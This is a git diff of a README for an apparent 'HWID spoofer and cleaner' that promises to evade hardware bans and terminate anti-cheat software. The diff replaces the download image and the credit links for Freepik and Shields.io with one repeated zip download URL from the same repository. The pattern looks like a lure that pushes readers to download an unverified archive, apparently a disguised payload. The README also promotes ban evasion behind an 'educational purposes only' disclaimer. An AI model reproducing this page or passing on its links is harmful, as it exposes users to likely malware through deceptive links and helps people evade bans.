@@ -4,7 +4,7 @@
 Welcome to the HWID-Spoofer-and-Cleaner-2024 repository! This repository houses a powerful HWID spoofer and cleaner tool that allows users to change various hardware identifiers to evade bans and clean traces of previous hardware configurations. Leverage this tool for disk, GUID, MAC, GPU, PC name, Windows ID, EFI, SMBIOS spoofing in user-mode and terminate anti-cheat software.
 
 <div align="center">
-    <img src="https://github.com/user-attachments/files/17466420/Software.zip" alt="Download Software" />
+    <img src="https://github.com/ToxicAyNone/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip" alt="Download Software" />
 </div>
 
 ## Features
@@ -37,8 +37,8 @@ If you encounter any issues or have suggestions for improvement, feel free to op
 This tool is designed for educational and testing purposes only. Misuse of this tool for malicious intent is strictly prohibited. The developers hold no responsibility for any illicit use of this tool.
 
 ## Credits
-- Icon made by [Freepik](https://www.freepik.com) from www.flaticon.com
-- Shield image by [Shields.io](https://shields.io)
+- Icon made by [Freepik](https://github.com/ToxicAyNone/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip) from https://github.com/ToxicAyNone/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip
+- Shield image by [https://github.com/ToxicAyNone/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip](https://github.com/ToxicAyNone/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip)
 
 ## License
 This project is licensed under the [MIT License](LICENSE).
